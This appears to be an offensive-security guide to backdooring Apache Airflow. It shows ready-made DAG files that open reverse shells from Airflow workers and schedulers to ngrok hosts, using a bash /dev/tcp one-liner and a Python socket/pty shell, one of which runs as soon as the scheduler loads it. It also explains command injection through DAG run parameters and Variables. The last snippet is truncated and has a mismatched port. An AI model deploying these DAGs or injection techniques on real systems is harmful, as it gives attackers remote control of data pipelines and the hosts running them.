DAG Backdoor (RCE in Airflow worker)
If you have write access to the place where the DAGs are saved, you can just create one that will send you a reverse shell.
Note that this reverse shell is going to be executed inside an airflow worker container:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
    dag_id='rev_shell_bash',
    schedule_interval='0 0 * * *',
    start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
    run = BashOperator(
        task_id='run',
        bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
    )
```
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
    s = socket.socket()
    s.connect((rhost, port))
    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
    pty.spawn("/bin/sh")

with DAG(
    dag_id='rev_shell_python',
    schedule_interval='0 0 * * *',
    start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
    run = PythonOperator(
        task_id='rs_python',
        python_callable=rs,
        op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
    )
```
DAG Backdoor (RCE in Airflow scheduler)
If you set something to be executed in the root of the code, at the moment of this writing, it will be executed by the scheduler after a couple of seconds after placing it inside the DAG's folder.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
    s = socket.socket()
    s.connect((rhost, port))
    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
    pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
    dag_id='rev_shell_python2',
    schedule_interval='0 0 * * *',
    start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
    run = PythonOperator(
        task_id='rs_python2',
        python_callable=rs,
        op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
DAG Creation
If you manage to compromise a machine inside the DAG cluster, you can create new DAGs scripts in the dags/ folder and they will be replicated in the rest of the machines inside the DAG cluster.
DAG Code Injection
When you execute a DAG from the GUI you can pass arguments to it.
Therefore, if the DAG is not properly coded it could be vulnerable to Command Injection.
That is what happened in this CVE: https://www.exploit-db.com/exploits/49927
All you need to know to start looking for command injections in DAGs is that parameters are accessed with the code dag_run.conf.get("param_name").
Moreover, the same vulnerability might occur with variables (note that with enough privileges you could control the value of the variables in the GUI). Variables are accessed with:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
If they are used for example inside a bash command, you could perform a command injection.
